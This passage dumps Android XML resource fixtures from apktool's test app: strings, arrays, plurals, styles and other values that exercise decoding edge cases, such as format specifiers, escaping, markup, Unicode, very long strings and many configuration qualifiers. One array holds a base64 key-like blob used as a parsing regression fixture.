aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-fr/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test_formatting1"><a href="http://www.foo.com" style="text-decoration:none;">http://www.foo.com</a></string>
    <string name="test_formatting2"><a href="http://www.foo.com" style="text-decoration:none">http://www.foo.com</a></string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-ldrtl/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-lowdr-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001-mnc00/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001-mnc01/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/anims.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <anim name="test_anim0" />
    <anim name="test_anim1">@android:anim/bounce_interpolator</anim>
    <anim name="test_anim2">@android:anim/cycle_interpolator</anim>
    <anim name="test_anim3">@android:anim/decelerate_interpolator</anim>
    <anim name="test_anim4">@android:anim/fade_in</anim>
    <anim name="test_anim5">@android:anim/fade_out</anim>
    <anim name="test_anim6">@android:anim/linear_interpolator</anim>
    <anim name="test_anim7">@android:anim/overshoot_interpolator</anim>
    <anim name="test_anim8">@android:anim/slide_in_left</anim>
    <anim name="test_anim9">@android:anim/slide_out_right</anim>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/arrays.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <array name="test_array0" />
    <string-array name="test_array1">
        <item>TEST1</item>
        <item>TEST2</item>
        <item>TEST3</item>
        <item>%2$s foo %1$d</item>
        <item>http://google.com&amp;boo=1&amp;foo=2</item>
        <item>&lt;b>Bolded Text&lt;/b></item>
        <item>&lt;font size=16 align=middle>Small&lt;/font></item>
    </string-array>
    <integer-array name="test_array2">
        <item>-1</item>
        <item>0</item>
        <item>1</item>
    </integer-array>
    <array name="test_array3">
        <item></item>
        <item>true</item>
        <item>TEST</item>
        <item>5</item>
        <item>5.5</item>
        <item>10.0sp</item>
        <item>#ff123456</item>
    </array>
    <string-array name="issue_409">
        <item>@string/test1</item>
        <item>foo</item>
        <item>foo2</item>
    </string-array>
    <string-array name="issue_329">
        <item>res/</item>
        <item>view/</item>
    </string-array>
    <string-array name="issue_2806">
        <item>MIICXAIBAAKBgQCjcGqTkOq0CR3rTx0ZSQSIdTrDrFAYl29611xN8aVgMQIWtDB/lD0W5TpKPuU9iaiG/sSn/VYt6EzN7Sr332jj7cyl2WrrHI6ujRswNy4HojMuqtfab5FFDpRmCuvl35fge18OvoQTJELhhJ1EvJ5KUeZiuJ3u3YyMnxxXzLuKbQIDAQABAoGAPrNDz7TKtaLBvaIuMaMXgBopHyQd3jFKbT/tg2Fu5kYm3PrnmCoQfZYXFKCoZUFIS/G1FBVWWGpD/MQ9tbYZkKpwuH+t2rGndMnLXiTC296/s9uix7gsjnT4Naci5N6EN9pVUBwQmGrYUTHFc58ThtelSiPARX7LSU2ibtJSv8ECQQDWBRrrAYmbCUN7ra0DFT6SppaDtvvuKtb+mUeKbg0B8U4y4wCIK5GH8EyQSwUWcXnNBO05rlUPbifsDLv/u82lAkEAw39sTJ0KmJJyaChqvqAJ8guulKlgucQJ0Et9ppZyet9iVwNKX/aW9UlwGBMQdafQ36nd1QMEA8AbAw4D+hw/KQJBANJbHDUGQtk2hrSmZNoV5HXB9Uiq7v4N71k5ER8XwgM5yVGs2tX8dMM3RhnBEtQXXs9LW1uJZSOQcv7JGXNnhN0CQBZenzrJAWxh3XtznHtBfsHWelyCYRIAj4rpCHCmaGUM6IjCVKFUawOYKp5mmAyObkUZf8ue87emJLEdynC1CLkCQHduNjP1hemAGWrd6v8BHhE3kKtcK6KHsPvJR5dOfzbdHAqVePERhISfN6cwZt5p8B3/JUwSR8el66DF7Jm57BM=</item>
    </string-array>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/bools.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <bool name="test_bool0" />
    <bool name="test_bool1">false</bool>
    <bool name="test_bool2">true</bool>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/colors.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="test_color0" />
    <color name="test_color1">#ff123456</color>
    <color name="test_color2">@android:color/white</color>
    <color name="test_color3">#00000000</color>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/dimens.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <dimen name="test_dimen0" />
    <dimen name="test_dimen1">10.0dp</dimen>
    <dimen name="test_dimen2">10.0sp</dimen>
    <dimen name="test_dimen3">10.0pt</dimen>
    <dimen name="test_dimen4">10.0px</dimen>
    <dimen name="test_dimen5">10.0mm</dimen>
    <dimen name="test_dimen6">10.0in</dimen>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/drawables.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <drawable name="test_drawable0" />
    <drawable name="test_drawable1">@android:drawable/btn_default</drawable>
    <drawable name="test_drawable2">@drawable/ic_launcher</drawable>
    <drawable name="test_drawable3">#00000000</drawable>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/ids.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <id name="test_id1" />
    <id name="test_id2" />
    <id name="test_id3">@id/test_id1</id>
    <id name="test_id4">@id/test_id3</id>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/integers.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <integer name="test_integer0" />
    <integer name="test_integer1">-1</integer>
    <integer name="test_integer2">0</integer>
    <integer name="test_integer3">1</integer>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/layouts.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <layout name="test_layout0" />
    <layout name="test_layout1">@android:layout/activity_list_item</layout>
    <layout name="test_layout2">@android:layout/browser_link_context_header</layout>
    <layout name="test_layout3">@android:layout/simple_list_item_1</layout>
    <layout name="test_layout4">@android:layout/simple_spinner_item</layout>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/plurals.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <plurals name="test_plurals0" />
    <plurals name="test_plurals1">
        <item quantity="one">%1$s, %2$d foo</item>
        <item quantity="other">%1$s, %2$d foo(s)</item>
    </plurals>
    <plurals name="test_plurals2">
        <item quantity="one">%d foo</item>
        <item quantity="other">%d foos</item>
    </plurals>
    <plurals name="test_plurals3">
        <item quantity="one">foo %d moo</item>
        <item quantity="other">foo %d moos</item>
    </plurals>
    <plurals name="test_plurals4">
        <item quantity="one">foo 1</item>
        <item quantity="other">foo %d</item>
    </plurals>
    <plurals name="issue_658">
        <item quantity="one">&lt;b>%d&lt;/b> 1</item>
        <item quantity="other">&lt;b>%d&lt;/b> guide123</item>
    </plurals>
    <plurals name="issue_1431">
        <item quantity="one">Vous disposez de &lt;font color=#8c593c>%1$d contenu&lt;/font> sur &lt;font color=#8c593c>%2$d disponibles&lt;/font></item>
        <item quantity="other">Vous disposez de &lt;font color=#8c593c>%1$d contenus&lt;/font> sur &lt;font color=#8c593c>%2$d disponibles&lt;/font></item>
    </plurals>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test_string0" />
    <string name="test_string1">@null</string>
    <string name="test_string2">Lorem ipsum...</string>
    <string name="test_string3">\@null</string>
    <string name="test_string4">\?missing</string>
    <string name="test_string5">#ff123456</string>
    <string name="test_string6">&amp;</string>
    <string name="test_string7">"'"</string>
    <string name="test_string8">\"</string>
    <string name="test_string9">\u0005</string>
    <string name="test_string10">" foo  bar   "</string>
    <string name="test_string11">"foo
bar"</string>
    <string name="test_string12"> foo<b>bar <i> baz </i></b> <u>foo</u></string>
    <string name="test_string13">foo<sometag someattr1="someval1" someattr2="someval2">bar</sometag>baz</string>
    <string name="test_string14">foo<span style="font-family:serif;font-size: 12px;">bar</span>baz</string>
    <string name="test_string15">foo<span href="https://test.com/1234#param=val" style="font-family: serif; font-size:12px;">bar</span>baz</string>
    <string name="test_string16">foo<b>bar<i>"b
        az"</i></b>foo</string>
    <string name="test_string17" formatted="false">%d of %d</string>
    <string name="test_string18" formatted="false">foo %d bar %</string>
    <string name="test_string19">%2$s foo %1$d</string>
    <string name="test_string20" formatted="false">%-e foo %,d</string>
    <string name="test_string21">%2$-e foo %1$,d</string>
    <string name="test_string22" formatted="false">%02d foo %01d</string>
    <string name="test_string23" formatted="false">%d foo %1</string>
    <string name="test_string24" formatted="false">%1% foo %2%</string>
    <string name="test_string25" formatted="false">foo %s bar %2$s baz</string>
    <string name="test_string26">賞金鬥士14</string>
    <string name="test_string27">{id:65538,v:2,tid:20003,mst:1,x:-1,y:-1,a:6000,b:3000,lm:{chp:1000,rep:0,bt:0,mp:[[101,0,1,0],[101,0,1,1],[101,0,1,2],[101,0,1,3],[101,0,1,4],[101,0,1,5],[100,0,0,0],[100,0,0,1],[100,0,0,2],[100,0,0,3],[100,0,0,4],[100,0,0,5]]},rm:{chp:1000,rep:0,bt:0,mp:[[100,0,1,0],[100,0,1,1],[100,0,1,2],[100,0,1,3],[100,0,1,4],[100,0,1,5],[101,0,0,0],[101,0,0,1],[101,0,0,2],[101,0,0,3],[101,0,0,4],[101,0,0,5]]}}</string>
    <string name="test_string28">{al:[[180,0,7,0,0,1000],[109,0,5,0,0],[109,0,5,2,0],[109,0,5,4,0],[100,0,3,0,0],[100,0,3,1,0],[100,0,3,2,0],[100,0,3,3,0],[100,0,3,4,0],[100,0,3,5,0],[103,0,1,0,0],[103,0,1,1,0],[103,0,1,2,0],[103,0,1,3,0],[103,0,1,4,0],[103,0,1,5,0],[106,0,2,0,0],[106,0,2,1,0],[106,0,2,2,0],[106,0,2,3,0],[106,0,2,4,0],[106,0,2,5,0],[800,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[850],[950],[900,0],[1000,0,0]],v:4,s:-1575044211,rl:[[180,0,7,0,0,1000],[103,0,0,0,0],[103,0,0,1,0],[103,0,0,2,0],[103,0,0,3,0],[103,0,0,4,0],[103,0,0,5,0],[111,0,3,0,0],[111,0,3,1,0],[111,0,3,2,0],[111,0,3,3,0],[111,0,3,4,0],[111,0,3,5,0],[102,0,4,0,0],[102,0,4,1,0],[102,0,4,2,0],[102,0,4,3,0],[102,0,4,4,0],[102,0,4,5,0],[107,0,5,0,0],[107,0,5,1,0],[107,0,5,2,0],[107,0,5,3,0],[107,0,5,4,0],[107,0,5,5,0],[106,0,2,0,0],[106,0,2,1,0],[106,0,2,2,0],[106,0,2,3,0],[106,0,2,4,0],[106,0,2,5,0],[900],[1000,0,0]],m:[]}</string>
    <string name="test_string29" formatted="false">category=temp%temp%foo</string>
    <string name="test_string30">res/foo/</string>
    <string name="test_string31">res/foo</string>
    <string name="test_string32">[<font size="17">TEST STRING</font>]</string>
    <string name="test_string33"><font size="17">[TEST STRING]</font></string>
    <string name="test_string34">[<font size="17">TEST STRING]</font></string>
    <string name="test_string35"><font size="17">[TEST STRING</font>]</string>
    <string name="test_string36"><font size="17">TEST STRING</font></string>
    <string name="test_string37">[<font size="17">Ţåþ ţö ţýþé þåššŵöŕð one two three]</font></string>
    <string name="test_string38">[<font size="17">Ţåþ ţö ţýþé þåššŵöŕð one two three</font>]</string>
    <string name="test_string39"><font size="17">[Ţåþ ţö ţýþé þåššŵöŕð one two three</font>]</string>
    <string name="test_string40">[<font size="17">]Ţåþ ţö ţýþé þåššŵöŕð one two three</font></string>
    <string name="test_string41"><font size="17">[Ţåþ ţö ţýþé þåššŵöŕð one two three]</font></string>
    <string name="test_string42">🔆</string>
    <string name="test_string43"><br/></string>
    <string name="test_string44"><ul> <li><b>aaaaa aa aaaaa</b> – aaaaaaa aaaaaaaaaa aa aaaaaaaa aaaaaa aaaaa (aaaa) aaaa aaaaaaaaa aaaaa aa aaaaaaaaa aaaaaaa aaaa</li> <li><b>aaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaa</b> – aaaaaaa aaaaaaaaaa aaaaaaaaa aaaa aaaaaa aa aaaa aaaa aaaa aaaa aaaaaaa aaaaaaaaaaaaa, aaaaaa aaa aaaaaaaaaa (aaa) aaaaaaaaaaaaaaa</li> <li><b>aaaaaaaaaaa aaaaaa aaaaaaaaaa</b> – aaaaaaaaaa aaaa aaaaaa aa a aaa aa aaaaaa aaa aaaaaaa (aaaaa aaaaaaaa) aaaaaaaa aa aaaaaa aaaaa aaa aaaa</li> </ul></string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc001/styles.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="TextAppearance" parent="@android:style/TextAppearance" />
    <style name="TextAppearance.EditEvent_Label" parent="@style/TextAppearance">
        <item name="android:gravity">center_vertical</item>
        <item name="android:popupAnimationStyle">@empty</item>
        <item name="android:divider">@null</item>
    </style>
    <style name="TextAppearance.EditEvent_Button" parent="@style/TextAppearance.EditEvent_Label">
        <item name="android:textColor">#ff777777</item>
        <item name="android:divider">?android:dividerVertical</item>
    </style>
    <style name="Foo.Bar" parent=""/>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc002/arrays.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string-array name="test_array4">
        <item>@string/test_string1</item>
        <item>@string/test_string2</item>
    </string-array>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc002/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test_reference1">@string/test1</string>
    <string name="test_reference2">@android:string/ok</string>
    <string name="test_reference3">?android:textStyle</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc003/arrays.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string-array name="test_array4">
        <item>3.0in</item>
    </string-array>
    <string-array name="test_array5">
        <item>65.0%</item>
        <item>65%</item>
    </string-array>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc003/bools.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <item type="bool" name="test_crossType_str2bool" format="string">TEST</item>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc003/integers.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <item type="integer" name="test_crossType_str2int" format="string">TEST</item>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc003/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test_crossType_bool2str">true</string>
    <string name="test_crossType_int2str">5</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc004-mnc04-en-rUS-ldrtl-sw100dp-w200dp-h300dp-long-round-highdr-land-desk-night-xhdpi-finger-keyssoft-12key-navhidden-dpad-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1" />
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc238-mnc06/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mcc238-mnc870/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-mnc01/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-neuter/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="long_string_32767">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa